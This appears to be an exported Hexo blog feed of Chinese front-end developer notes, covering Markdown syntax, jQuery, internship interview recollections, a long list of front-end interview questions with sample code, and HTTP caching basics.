**_加粗+斜体_** 删除线 删除线 ~~删除线~~ 17.语义标签 描述 效果 代码 斜体 斜体 &lt;i&gt;斜体&lt;/i&gt; 加粗 加粗 &lt;b&gt;加粗&lt;/b&gt; 强调 强调 &lt;em&gt;强调&lt;/em&gt; 上标 Za Z&lt;sup&gt;a&lt;/sup&gt; 下标 Za Z&lt;sub&gt;a&lt;/sub&gt; 键盘文本 Ctrl &lt;kbd&gt;Ctrl&lt;/kbd&gt; 换行 18.格式化文本 保持输入排版格式不变 代码 12345 &lt;pre&gt;hello world hi hello world &lt;/pre&gt; 演示 hello world hi hello world 错误解决方法 注: 标签内部添加空格 或者 直接使用12345678910111213141516**代码1(插入空格)** **演示**&lt;pre&gt; &lt; div&gt; &lt; div&gt;&lt; /div&gt; &lt; div&gt;&lt; /div&gt; &lt; div&gt;&lt; /div&gt; &lt; /div&gt;&lt;/pre&gt;#### 19.公式 &#123;#1&#125; &gt; 注: 1个$左对齐，2个居中 **代码** $$ x \href{why-equal.html}{=} y^2 + 1 $$$ x = {-b \pm \sqrt{b^2-4ac} \over 2a}. $123456789101112**演示**$$ x \href&#123;why-equal.html&#125;&#123;=&#125; y^2 + 1 $$ $ x = &#123;-b \pm \sqrt&#123;b^2-4ac&#125; \over 2a&#125;. $#### 20.分隔符 &gt; 注: 最少三个 --- 或 ***或 * * * **代码** * 1234567**演示** ***---* * *#### 21.脚注**代码** Markdown[^1][^1]: Markdown是一种纯文本标记语言 //在文章最后面显示脚注 1234567891011**演示** Markdown[^1] [^1]: Markdown是一种纯文本标记语言#### 22.锚点**代码** &gt; 注: 只有标题支持锚点， 跳转目录方括号后 保持空格#### 23.定义型列表&gt; 注: 解释型定义 Markdown: 轻量级文本标记语言，可以转换成html，pdf等格式 // 开头一个: + Tab 或 四个空格 代码块定义: 代码块定义…… var a = 10; // 保持空一行与 递进缩进123456789101112**演示** Markdown : 轻量级文本标记语言，可以转换成html，pdf等格式 // 开头一个`:` + `Tab` 或 四个空格代码块定义: 代码块定义…… var a = 10; #### 24.自动邮箱链接 **代码** &#120;&#x78;&#120;&#64;&#111;&#x75;&#116;&#x6c;&#111;&#x6f;&#107;&#46;&#99;&#x6f;&#x6d;123456**演示** &lt;xxx@outlook.com&gt; #### 25.流程图**代码** flow // 流程st=&gt;start: 开始|past:&gt; http://www.baidu.com // 开始 e=&gt;end: 结束 // 结束c1=&gt;condition: 条件1:&gt;http://www.baidu.com[_parent]//判断条件 c2=&gt;condition: 条件2 // 判断条件c3=&gt;condition: 条件3 // 判断条件io=&gt;inputoutput: 输出 // 输出//—————-以上为定义参数————————- //—————-以下为连接参数————————-// 开始-&gt;判断条件1为no-&gt;判断条件2为no-&gt;判断条件3为no-&gt;输出-&gt;结束st-&gt;c1(yes,right)-&gt;c2(yes,right)-&gt;c3(yes,right)-&gt;io-&gt;e c1(no)-&gt;e // 条件1不满足-&gt;结束c2(no)-&gt;e // 条件2不满足-&gt;结束c3(no)-&gt;e // 条件3不满足-&gt;结束 12#### 26.时序图**代码** sequenceA-&gt;&gt;B: 你好Note left of A: 我在左边 // 注释方向，只有左右，没有上下Note right of B: 我在右边B–&gt;A: 很高兴认识你``` 27.生成侧边栏扩展代码 注: 生成侧边栏一般是插入JS，再就是模板,总体来说，很是麻烦，效果一般，不作详解。 作者仓库：i5ting_ztree_tocEND]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQuery]]></title>
    <url>%2F2018%2F05%2F06%2FJQuery%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[==1. jQuery extend()和jQuery.fn.extend()== 两者调用方式不同： jQuery.extend(),一般由传入的全局函数来调用，主要是用来拓展个全局函数，如$.init()，$.ajax(); jQuery.fn.extend(),一般由具体的实例对象来调用，可以用来拓展个选择器，例如$.fn.each(); 两者的主要功能作用不同： jQuery.extend(object); 为扩展jQuery类本身，为自身添加新的方法。 jQuery.fn.extend(object);给jQuery对象添加方法 大部分插件都是用jQuery.fn.extend()]]></content>
      <categories>
        <category>Jquery</category>
      </categories>
      <tags>
        <tag>js,Jquery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端实习总结]]></title>
    <url>%2F2018%2F05%2F06%2F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[百度一面： 内联元素与块级元素的区别，inline-block特性，标签为什么可以定义大小。 对css刻度的理解？em和rem的区别？若line-height为100%是什么情况？若line-height为1.5无单位是什么情况？ call和apply的区别？（记不清问没问） 顺序插入n个标签，然后点击某个弹出它的序号？如何创建元素？如何插入元素？注意闭包的同时如何能对其进行优化？（优化没答上来） 事件流？IE下是事件冒泡还是事件捕捉？addEventListener和attachEvent？ 用原生就是实现文档中对类的获取如同Jquery中的$(.abcd)?本题中回答时判断dom中的类与传入的类名是否相同时用了indexOf，被指出不对，应用正则表达式？可惜正则不会。。。。 如何实现不同页面的通信 localStorage与sessionStorage的异同。 若由a界面调到b界面再从b界面点击确定调到c界面，如何点击浏览器中的后退按钮直接返回到a界面。（不会） 说出几种水平垂直居中的方法。（这个问题一面二面都问了） link和@import的区别 百度二面： 简单介绍下项目，说明项目中遇到的难点是如何解决的。 做项目会切图一般选择什么格式的图。这里gg了，回答是png因为png可以使图片透明？问什么时候选择jpg？哪个是无损压缩哪个是有损压缩。ps：平时我都是看心情的好吗 CSS优先级 说出几种水平垂直居中的方法。（这个问题一面二面都问了） 如何设计一个单页面应用 对路由的理解 H5的新特性？回答了新增了哪些元素，移除了哪些元素。 然后回答了新增了Web存储API，问sessionStorage和 localStorage 的区别？如果baike.baidu.com和www.baidu.com能否共享sessionStorage？能否共享localStorage？baidu.com与www.baidu.com能否共享localStorage？localStorage的存储时间是多久？存储大小？sessionStorage存储大小是多少？cookie存储量？ 继续h5新特性，说了新增canvas API。问canvas绘图与svg绘图有何区别？ 继续h5新特性，说了websocket。问websocket与http的区别？websocket与socket有什么关系？ 继续h5新特性，audio与vedio里一般选择什么格式的音频或视频？ 终于结束H5新特性了？问get和post的区别？ 说了get有可能会传状态码304，post会传200。问状态码301和302的区别，什么情况下会是301什么情况是302。 如果是get请求http如何判断返回的是304，或是200。（Etag） 刚说http时说了请求头，问有没有请求体，请求体里放的是什么？这时脑子一抽回答没有，就问那文件上传怎么上传？ 最后问他问题的时候问了请求体的问题，他回答说是有请求体的，比如在文件上传的时候请求头里会有一个参数，然后请求体里是二进制文件。 浏览器缓存机制 阿里一面：感觉要挂 介绍自己前端情况 git的相关命令，如何解决冲突 对闭包的理解 盒模型 BFC 事件模型 事件代理 在线测评中如何使用事件代理 知道哪些设计模式、设计原则 在项目中遇到冲突，如何解决 前端哪个方向发展 受到批评，心理状态 阿里二面一面竟然没挂，杀入二面，但感觉二面会挂 介绍一下英语比赛项目 介绍下长连接 如何实现长连接 如何实现轮询 setTimeout与setInterval区别 递归调用 setTimeout 与setInterval有何区别 最新的项目用到哪些前端框架 还学过哪些语言，对那种了解较深 设计模式 阅读过jquery源码？介绍源码 压力大的时候心理状态 如何判断一个数字]]></content>
      <categories>
        <category>实习</category>
      </categories>
      <tags>
        <tag>前端实习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试300题]]></title>
    <url>%2F2018%2F05%2F06%2F%E9%9D%A2%E8%AF%95300%E9%A2%98%2F</url>
    <content type="text"><![CDATA[1、手写jsonp的实现 123456function createJs(sUrl) &#123; var s = document.createElement(&apos;script&apos;); s.type = &apos;text/javascript&apos;; s.src = sUrl; document.getElementByTagName(&apos;head&apos;)[0].appendChild(s);&#125; 2、手写链表倒数第K个查找1234567891011121314151617181920212223242526272829/*public class ListNode &#123; int val; ListNode next = null; ListNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public ListNode FindKthToTail(ListNode head,int k) &#123; if(head==null||k&lt;=0)&#123; return null; &#125; ListNode pre=head; ListNode last=head; for(int i=1;i&lt;k;i++)&#123; if(pre.next!=null)&#123; pre=pre.next; &#125;else&#123; return null; &#125; &#125; while(pre.next!=null)&#123; pre = pre.next; last=last.next; &#125; return last; &#125;&#125; 3、http请求头，请求体，cookie在哪个里面？url在哪里面？ cookie在request header里，url在general header里 4、原型链的解释 JavaScript 的每个对象都继承另一个对象，后者称为“原型”（prototype）对象。只有null除外，它没有自己的原型对象 对象的属性和方法，有可能是定义在自身，也有可能是定义在它的原型对象。由于原型本身也是对象，又有自己的原型，所以形成了一条原型链（prototype chain）。比如，a对象是b对象的原型，b对象是c对象的原型，以此类推 如果一层层地上溯，所有对象的原型最终都可以上溯到Object.prototype，即Object构造函数的prototype属性指向的那个对象。那么，Object.prototype对象有没有它的原型呢？回答可以是有的，就是没有任何属性和方法的null对象，而null对象没有自己的原型。 5、对闭包的理解，实现一个暴露内部变量，而且外部可以访问修改的函数 Closures (闭包)是使用被作用域封闭的变量，函数，闭包等执行的一个函数的作用域。通常我们用和其相应的函数来指代这些作用域。(可以访问独立数据的函数)123456function A () &#123; var a = 1; return function () &#123; a++; &#125;&#125; 6、基本的数据类型 number,string,boolen,undefined,null,object 7、基本的两列自适应布局 左列定宽，右列自适应margin + float 12345678&lt;div class="parent"&gt; &lt;div class="left"&gt;&lt;p&gt;left&lt;/p&gt;&lt;/div&gt; &lt;div class="right-fix"&gt; &lt;div class="right"&gt; &lt;p&gt;right&lt;/p&gt;&lt;p&gt;right&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 1234567891011121314.left&#123; float: left; //向左浮动 width: 100px; //固定宽度 position: relative;//由于.left与.right-fix重合，且.right-fix在DOM树上的位置比.left要后，因此.right-fix会遮挡住.left，设置.left为relative可以让其冒出来。 &#125;.right-fix&#123; float: right; //向右浮动 width: 100%; //为了自适应设为100% margin-left: -100px;//由于宽度设为100%，.right-fix遭到浏览器换行处理；因此通过设置负的margin值，在左侧制造出100px的空白，使.right-fix与.left重合（即处于同一行）&#125;.right&#123; margin-left: 120px; //由于.left和.right-fix重合了，因此给.right设置一个margin-left，避免内容区（.right）与.left重合。另外，120px - 100px = 多出来的20px实际上就相当于.left和.right之间的间隔了。&#125; absolute123456789&lt;div class="parent"&gt; &lt;div class="left"&gt; &lt;p&gt;left&lt;/p&gt; &lt;/div&gt; &lt;div class="right"&gt; &lt;p&gt;right&lt;/p&gt; &lt;p&gt;right&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 12345678910111213.parent&#123; position: relative;&#125;.left&#123; position: absolute; left: 0; width: 100px;&#125;.right&#123; position: absolute; left: 120px; //比.left的left多出20px，相当于间隔 right: 0;&#125; 左列不定宽，右列自适应float + BFC123456789&lt;div class="parent"&gt; &lt;div class="left"&gt; &lt;p&gt;left&lt;/p&gt; &lt;/div&gt; &lt;div class="right"&gt; &lt;p&gt;right&lt;/p&gt; &lt;p&gt;right&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 12345678.left&#123; float: left; width: 100px; margin-right: 20px; //形成20px的间隔&#125;.right&#123; overflow: hidden; //通过设置overflow: hidden来触发BFC特性&#125; 这个方法主要是应用到BFC的一个特性： 浮动元素的块状兄弟元素会无视浮动元素的位置，尽量占满一整行，这样该兄弟元素就会被浮动元素覆盖。 若浮动元素的块状兄弟元素为BFC，则不会占满一整行，而是根据浮动元素的宽度，占据该行剩下的宽度，避免与浮动元素重叠。 浮动元素与其块状BFC兄弟元素之间的margin可以生效，这将继续减少兄弟元素的宽度。并不是一定要在.right上用overflow: hidden;，只要能触发BFC就好了，另外在IE6上也可以触发haslayout特性（推荐用*zoom: 1;）。 table布局123456789&lt;div class="parent"&gt; &lt;div class="left"&gt; &lt;p&gt;left&lt;/p&gt; &lt;/div&gt; &lt;div class="right"&gt; &lt;p&gt;right&lt;/p&gt; &lt;p&gt;right&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 1234567891011.parent&#123; display: table; width: 100%; table-layout: fixed;&#125;.left,.right&#123; display: table-cell;&#125;.left&#123; width: 100px; padding-right: 20px;&#125; 这个方法是表格布局的典型运用。说真的，我也很迷惘要不要使用表格布局，毕竟已经是上个时代的产物了，虽然已经不再用的HTML结构了，但用上相应的CSS其实思路跟以前是变化不大的。 这个方法主要是利用了表格(table)的宽度必然等于其所有单元格(table-cell)加起来的总宽度，那么只要表格的宽度一定，其中一个（或几个）单元格的宽度也一定，那么另外一个未设置宽度的单元格则会默认占满剩下的宽度，即实现自适应。 flex 123456789&lt;div class="parent"&gt; &lt;div class="left"&gt; &lt;p&gt;left&lt;/p&gt; &lt;/div&gt; &lt;div class="right"&gt; &lt;p&gt;right&lt;/p&gt; &lt;p&gt;right&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 12345678910.parent&#123; display: flex;&#125;.left&#123; margin-right: 20px;&#125;.right&#123; flex: 1;&#125;.left p&#123;width: 200px;&#125; flex布局的自适应我就不多说了，本来就是设计来自适应的，只需要用上flex: 1;，就能让.right分到.parent的宽度减去.left的宽度 8、unix中常用的命令行 ls,pwd,ls,vim,cd,cp,rm,chmod 9、OSI模型，HTTP,TCP,UDP分别在哪些层 http在第7层应用层 TCP／UDP在第五层传输层 10、解释平衡二叉树，以及在数据结构中的应用（红黑树） 11、快排的时间复杂度和空间复杂度 递归法1234567891011121314151617181920212223242526272829void swap(int *x, int *y) &#123; int t = *x; *x = *y; *y = t;&#125;void quick_sort_recursive(int arr[], int start, int end) &#123; if (start &gt;= end) return;//這是為了防止宣告堆疊陣列時當機 int mid = arr[end]; int left = start, right = end - 1; while (left &lt; right) &#123; while (arr[left] &lt; mid &amp;&amp; left &lt; right) left++; while (arr[right] &gt;= mid &amp;&amp; left &lt; right) right--; swap(&amp;arr[left], &amp;arr[right]); &#125; if (arr[left] &gt;= arr[end]) swap(&amp;arr[left], &amp;arr[end]); else left++; if (left) &#123; quick_sort_recursive(arr, start, left - 1); &#125; quick_sort_recursive(arr, left + 1, end);&#125;void quick_sort(int arr[], int len) &#123; quick_sort_recursive(arr, 0, len - 1);&#125; 时间复杂度O(nlogn) 空间复杂度O(logn) 12、手写一个jQuery插件 13、在jquery方法和原型上面添加方法的区别和实现，以及jquery对象的实现 14、手写一个递归函数 15、对前端路由的理解？前后端路由的区别？ 16、介绍一下webpack和gulp，以及项目中具体的使用 17、你对es6的了解 18、解释一下vue和react，以及异同点 19、关于平衡二叉树 20、前后端分离的意义以及对前端工程化的理解 21、使用css实现一个三角形 22、用promise手写ajax 23、手写一个类的继承，并解释一下 24、解释一下call函数和apply函数的作用，以及用法 25、你说自己抗压能力强，具体表现在哪里？ 26、对前端前景的展望，以后前端会怎么发展 27、手写第一次面试没有写出来的链表问题，要求用es6写 28、平时是怎么学技术的？ 29、平时大学里面时间是怎么规划的？ 30、接下来有什么计划？这个学期和下个学期的计划是？ 31、项目中遇到的难点，或者你学习路上的难点 32、你是通过什么方法和途径来学习前端的 33、手写一个简单遍历算法 34、解释一下react和vue，以及区别 35、你在团队中更倾向于什么角色？ 36、对java的理解 37、介绍node.js，并且介绍你用它做的项目 38、手写一个js的深克隆 39、for函数里面setTimeout异步问题 40、手写归并排序 41、介绍自己的项目 42、实现两个数组的排序合并 43、手写一个原生ajax 44、手写一个promise版的ajax 45、手写实现一个promise 46、手写实现requireJS模块实现 47、手写实现jquery里面的insertAfter 48、react和vue的介绍以及异同 49、AMD和CMD，commonJS的区别 50、介绍一下backbone 51、了解过SEO吗？ 52、低版本浏览器不支持HTML5标签怎么解决？ 53、用js使低版本浏览器支持HTML5标签 底层是怎么实现的？ 54、实现一个布局：左边固定宽度为200，右边自适应，而且滚动条要自动选择只出现最高的那个 55、画出盒子模型，要使谷歌浏览器的盒子模型显示得跟IE浏览器一致（让谷歌跟ie一致，不是ie跟谷歌一致），该怎么做？ 56、手写JS实现类继承，讲原型链原理，并解释new一个对象的过程都发生了什么 57、Array对象自带的方法，一一列举 58、若干个数字，怎么选出最大的五个 59、Array对象自带的排序函数底层是怎么实现的？ 60、常用的排序算法有哪些，介绍一下选择排序 61、了解navigator对象吗？ 62、手写一个正则表达式，验证邮箱 63、link和@import引入CSS的区别？ 64、刚才说有些浏览器不兼容@import，具体指哪些浏览器？ 65、介绍一下cookie,localstorage,sessionstorage,session 66、jquery绑定click的方法有几种 67、你的优点/竞争力 68、移动端适配问题 69、react的难点在哪里 70、做过css动画吗 71、如何优化网站 72、以后的规划 73、你做过最困难的事情是啥？ 74、css3 html5新特性 75、闭包，ES6，跨域 76、问做过啥项目，用到什么技术，遇到什么困难 77、兼容性 78、盒子模型 79、Array的unshift() method的作用是什么？如何连接两个Array？如何在Array里移除一个元素？ 80、用纸笔写一个Closure，任意形式和内容 81、知不知道Array-like Object？ 82、如何用Native JavaScript来读写Cookie？ 83、知不知道CSS Box-model？ 84、如何做一个AJAX Request？ 85、Cross-domain access有没有了解？ 86、前端安全方面有没有了解？XSS和CSRF如何攻防？ 87、HTTP Response的Header里面都有些啥？ 88、知不知道HTTP2？ 89、输入URL后发生了什么？ 90、new operator实际上做了什么？ 91、面向对象的属性有哪些？ 92、做一个两栏布局，左边fixed width，右边responsive，用纸笔手写 93、讲一下AJAX Request 94、讲一下Cross-domain access 95、介绍一下做过的项目 96、问到了多个服务器怎么弄，架构之类的 97、angular的渲染流程 98、脏检查 99、nodejs的架构、优缺点、回调 100、css 盒模型 101、css 布局，左边定宽右边自适应 102、冒泡和捕获，事件流哪三个阶段？ 103、实现事件代理 104、原型链 105、继承的两种方法 106、ajax，原生ajax的四个过程 107、闭包，简单说一个闭包的应用，然后闭包的主要作用是什么 108、css:两个块状元素上下的margin-top和margin-bottom会重叠。啥原因？怎么解决？ 109、js：写一个递归。就是每隔5秒调用一个自身，一共100次 110、cookie和session有什么区别 111、网络分层结构 112、你的不足是什么？ 113、做了那么多项目，有没有自己的归纳总结 114、工程怎么进行文件管理 115、less和sass掌握程度 116、Cookie 是否会被覆盖，localStorage是否会被覆盖 117、事件代理js实现 118、Css实现动画效果 119、Animation还有哪些其他属性 120、Css实现三列布局 121、Css实现保持长宽比1:1 122、Css实现两个自适应等宽元素中间空10个像素 123、requireJS的原理是什么 124、如何保持登录状态 125、浮动的原理以及如何清除浮动 126、Html的语义化 127、原生js添加class怎么添加，如果本身已经有class了，会不会覆盖，怎么保留？ 128、Jsonp的原理。怎么去读取一个script里面的数据？ 129、如果页面初始载入的时候把ajax请求返回的数据存在localStorage里面，然后每次调用的时候去localStorage里面取数，是否可行。 130、304是什么意思？有没有方法不请求不经过服务器直接使用缓存 131、http请求头有哪些字段 132、数组去除一个函数。用arr.splice。又问splice返回了什么？应该返回的是去除的元素。 133、js异步的方法（promise，generator，async） 134、Cookie跨域请求能不能带上 一般是不会带上的，要设置xhr.withCredentials = true;目标服务器要设置Access-Control-Allow-Credentials，Access-Control-Allow-Origin 135、最近看什么开源项目？ 136、commonJS和AMD 137、平时是怎么学习的？ 138、为什么要用translate3d？ 139、对象中key-value的value怎么再放一个对象？ 140、Get和post的区别？ 145、Post一个file的时候file放在哪的？ 146、说说你对组件的理解 147、组件的html怎么进行管理 148、js的异步加载，promise的三种状态，ES7中的async用过么 149、静态属性怎么继承 150、js原型链的继承 151、jquery和zepto有什么区别 152、angular的双向绑定原理 153、angular和react的认识 154、MVVM是什么 155、移动端是指手机浏览器，还是native，还是hybrid 156、你用了移动端的什么库类和框架？ 157、移动端要注意哪些？ 158、适配有去考虑么，retina屏幕啊？ 159、rem是什么？em是什么？如果上一层就是根root了，em和rem等价么？ 160、怎么测试的？会自动化测试么？ 161、你觉得你什么技术最擅长？ 162、你平时有没有什么技术的沉淀？ 163、单向链表怎么查找有没有环？ 164、怎么得到一个页面的a标签？ 165、怎么在页面里放置一个很简单的图标，不能用img和background-img？ 166、正则表达式判断url 167、怎么去除字符串前后的空格 168、实现页面的局部刷新 169、绝对定位与相对定位的区别 170、js轮播实现思路 171、使用js画一个抛物线，抛物线上有个小球随着抛物线运动，有两个按钮能使小球继续运动停止运动 172、java五子棋，说下实现思路 173、如何让各种情况下的div居中(绝对定位的div,垂直居中,水平居中)？ 174、display有哪些值？说明他们的作用 175、css定义的权重 176、requirejs实现原理 177、requirejs怎么防止重复加载 178、ES6里头的箭头函数的this对象与其他的有啥区别 179、tcp/udp区别 180、tcp三次握手过程 181、xss与csrf的原理与怎么防范 182、mysql与 MongoDB的区别 183、w3c事件与IE事件的区别 184、有没有上传过些什么npm模块 185、IE与W3C怎么阻止事件的冒泡 186、gulp底层实现原理 187、webpack底层实现原理 188、gulp与webpack区别 189、vuejs与angularjs的区别 190、vuex是用来做什么的 191、说下你知道的响应状态码 192、ajax的过程以及 readyState几个状态的含义 193、你除了前端之外还会些什么？ 194、cookie与session的区别 195、一些关于php与java的问题 196、你觉得你哪个项目是你做的最好的 197、说说你在项目中遇到了哪些困难,是怎么解决的 198、前端优化你知道哪些 199、webpack是用来干嘛的 200、webpack与gulp的区别 201、es6与es7了解多少 202、说下你知道的响应状态码 203、看过哪些框架的源码 204、遇到过哪些浏览器兼容性问题 205、清除浮动有哪几种方式,分别说说 206、你知道有哪些跨域方式,分别说说 207、JavaScript有哪几种类型的值 208、使用 new操作符时具体是干了些什么 209、学习前端的方法以及途径 210、怎么实现两个大整数的相乘，说下思路 211、你学过数据结构没,说说你都了解些什么 212、你学过计算机操作系统没,说说你都了解些什么 213、你学过计算机组成原理没,说说你都了解些什么 214、你学过算法没,说说你都了解些什么 215、说下选择排序,冒泡排序的实现思路 216、用过哪些框架 217、让你设计一个前端css框架你怎么做 218、了解哪些设计模式说说看 219、说下你所了解的设计模式的优点 220、vue源码结构 221、状态码 222、浏览器缓存的区别 223、304与200读取缓存的区别 224、http请求头有哪些,说说看你了解哪些 225、js中this的作用 226、js中上下文是什么 227、js有哪些函数能改变上下文 228、你所了解的跨域的方法都说说看你了解的？ 229、要是让你自己写一个js框架你会用到哪些设计模式 230、平常在项目中用到过哪些设计模式,说说看 231、一来给了张纸要求写js自定义事件 232、前端跨域的方法 233、call与apply的区别 234、h5有个api能定位你知道是哪个吗？ 235、vue与angularjs中双向数据绑定是怎样实现的？ 236、webpack怎样配置？ 237、nodejs中的文件怎么读写？ 238、link和@import有什么区别？ 239、cookies，sessionStorage 和 localStorage 的区别 240、看过哪些前端的书？平时是怎么学习的 241、说下你所理解的mvc与mvvc 242、position有哪些值,说下各自的作用 243、写个从几个li中取下标的闭包代码 244、你的职业规划是怎么样的？ 245、移动端性能优化 246、lazyload如何实现 247、点透问题 248、前端安全 249、原生js模板引擎 250、repaint和reflow区别 251、requirejs如何避免循环依赖？ 252、实现布局：左边一张图片，右边一段文字（不是环绕） 253、window.onload和$(document).ready()的区别，浏览器加载转圈结束时哪个时间点？ 254、form表单当前页面无刷新提交 target iframe 255、setTimeout和setInterval区别，如何互相实现？ 256、如何避免多重回调—promise，promise简单描述一下，如何在外部进行resolve() 257、margin坍塌？水平方向会不会坍塌？ 258、伪类和伪元素区别 259、vue如何实现父子组件通信，以及非父子组件通信 260、数组去重 261、使用flex布局实现三等分，左右两个元素分别贴到左边和右边，垂直居中 262、平时如何学前端的，看了哪些书，关注了哪些公众号 263、实现bind函数 264、数组和链表区别，分别适合什么数据结构 265、对mvc的理解 266、描述一个印象最深的项目，在其中担任的角色，解决什么问题 267、http状态码。。。401和403区别？ 268、描述下二分查找 269、为什么选择前端，如何学习的，看了哪些书，《js高级程序设计》和《你不知道的js》有什么区别，看书，看博客，看公众号三者的时间是如何分配的？ 270、如何评价BAT？ 271、描述下在实习中做过的一个项目，解决了什么问题，在其中担任了什么角色？这个过程存在什么问题，有什么值得改进的地方？ 272、如何看待加班，如果有个项目需要连续一个月加班，你怎么看？ 273、遇到的压力最大的一件事是什么？如何解决的？ 274、平时有什么爱好 275、自身有待改进的地方 276、n长的数组放入n+1个数，不能重复，找出那个缺失的数 277、手里有什么offer 278、你对于第一份工作最看重的三个方面是什么？ 279、如何评价现在的前端？ 280、用原生js实现复选框选择以及全选非全选功能 281、用4个颜色给一个六面体上色有多少种情况 282、amd和cmd区别 283、为什么选择前端，移动端性能优化 284、vue的特点？双向数据绑定是如何实现的 285、Object.defineProperty 286、算法题：数组去重，去除重复两次以上的元素，代码题：嵌套的ul-li结构，根据input中输入的内容，去除相应的li节点，且如果某个嵌套的ul下面的li都被移除，则该ul的父li节点也要被移除 287、页面加载过程 288、浏览器如何实现图片缓存]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[http]]></title>
    <url>%2F2018%2F05%2F06%2Fhttp%2F</url>
    <content type="text"><![CDATA[网络HTTP 条件 GET 使用的方法？客户端向服务器发送一个包询问是否在上一次访问网站的时间后是否更改了页面，如果服务器没有更新，显然不需要把整个网页传给客户端，客户端只要使用本地缓存即可，如果服务器对照客户端给出的时间已经更新了客户端请求的网页，则发送这个更新了的网页给用户。 下面是一个具体的发送接受报文示例： 客户端发送请求： 1234GET / HTTP/1.1 Host: www.sina.com.cn:80 If-Modified-Since:Thu, 4 Feb 2010 20:39:13 GMT Connection: Close 第一次请求时，服务器端返回请求数据，之后的请求，服务器根据请求中的 If-Modified-Since 字段判断响应文件没有更新，如果没有更新，服务器返回一个 304 Not Modified响应，告诉浏览器请求的资源在浏览器上没有更新，可以使用已缓存的上次获取的文件 12345678HTTP/1.0 304 Not Modified Date: Thu, 04 Feb 2010 12:38:41 GMT Content-Type: text/html Expires: Thu, 04 Feb 2010 12:39:41 GMT Last-Modified: Thu, 04 Feb 2010 12:29:04 GMT Age: 28 X-Cache: HIT from sy32-21.sina.com.cn Connection: close CDNCDN的全称是Content Delivery Network，即内容分发网络，是指一种通过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户 内容分发网络节点会在多个地点，多个不同的网络上摆放。这些节点之间会动态的互相传输内容，对用户的下载行为最优化，并借此减少内容供应者所需要的带宽成本，改善用户的下载速度，提高系统的稳定性。 内容分发网络所需要的节点数量随着需求而不同，依照所需要服务的对象大小，有可能有数万台服务器]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS面试题]]></title>
    <url>%2F2018%2F05%2F06%2FJS%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[初级==0. JS继承的实现方式==原型链继承 核心： 将父类的实例作为子类的原型 构造继承 核心：使用父类的构造函数来增强子类实例，等于是复制父类的实例属性给子类 call &amp; apply ==1. 列举js异步编程的方法==回调函数，这是异步编程最基本的方法。事件监听，另一种思路是采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。发布/订阅，上一节的”事件”，完全可以理解成”信号”。Promises对象，Promises 对象是CommonJS 工作组提出的一种规范，目的是为异步编程提供统一接口。 ==2. JavaScript的数据类型都有什么？==基本数据类型：String,Boolean,Number,Undefined, Null 引用数据类型：Object(Array,Date,RegExp,Function) 那么问题来了，如何判断某变量是否为数组数据类型？ 方法一.判断其是否具有“数组性质”，如slice()方法。可自己给该变量定义slice方法，故有时会失效 方法二.obj instanceof Array 在某些IE版本中不正确 方法三.方法一二皆有漏洞，在ECMA Script5中定义了新方法Array.isArray(), 保证其兼容性，最好的方法如下： 123456if(typeof Array.isArray==="undefined")&#123; Array.isArray = function(arg)&#123; return Object.prototype.toString.call(arg)==="[object Array]" &#125;; &#125; ==3. 已知ID的Input输入框，希望获取这个输入框的输入值，怎么做？(不使用第三方框架)==1document.getElementById(“ID”).value ==4. 希望获取到页面中所有的checkbox怎么做？(不使用第三方框架)==12345678var domList = document.getElementsByTagName(‘input’)var checkBoxList = [];var len = domList.length; //缓存到局部变量while (len--) &#123; //使用while的效率会比for循环更高 if (domList[len].type == ‘checkbox’) &#123; checkBoxList.push(domList[len]); &#125;&#125; ==5. 设置一个已知ID的DIV的html内容为xxxx，字体颜色设置为黑色(不使用第三方框架)==123var dom = document.getElementById(“ID”);dom.innerHTML = “xxxx”;dom.style.color = “#000”; ==6. 当一个DOM节点被点击时候，我们希望能够执行一个函数，应该怎么做？== 直接在DOM里绑定事件： 在JS里通过onclick绑定：xxx.onclick = test 通过事件添加进行绑定：( ⊙ o ⊙ )啊！5addEventListener(xxx, ‘click’, test) IE为事件冒泡用attachEvent()那么问题来了，Javascript的事件流模型都有什么？ “事件冒泡”：事件开始由最具体的元素接受，然后逐级向上传播 “事件捕捉”：事件由最不具体的节点先接收，然后逐级向下，一直到最具体的 “DOM事件流”：三个阶段：事件捕捉，目标阶段，事件冒泡 ==7. 什么是Ajax和JSON，它们的优缺点。==Ajax是异步JavaScript和XML，用于在Web页面中实现异步数据交互。 优点： 可以使得页面不重载全部内容的情况下加载局部内容，降低数据传输量 避免用户不断刷新或者跳转页面，提高用户体验 缺点： 对搜索引擎不友好（ 要实现ajax下的前后退功能成本较大 可能造成请求数的增加 跨域问题限制 JSON是一种轻量级的数据交换格式，ECMA的一个子集 优点：轻量级、易于人的阅读和编写，便于机器（JavaScript）解析，支持复合数据类型（数组、对象、字符串、数字） ==8. 看下列代码输出为何？解释原因。==123var a;alert(typeof a); // undefinedalert(b); // 报错 解释：Undefined是一个只有一个值的数据类型，这个值就是“undefined”，在使用var声明变量但并未对其赋值进行初始化时，这个变量的值就是undefined。而b由于未声明将报错。注意未申明的变量和声明了未赋值的是不一样的。 ==9. 看下列代码,输出什么？解释原因。==12var a = null;alert(typeof a); //object 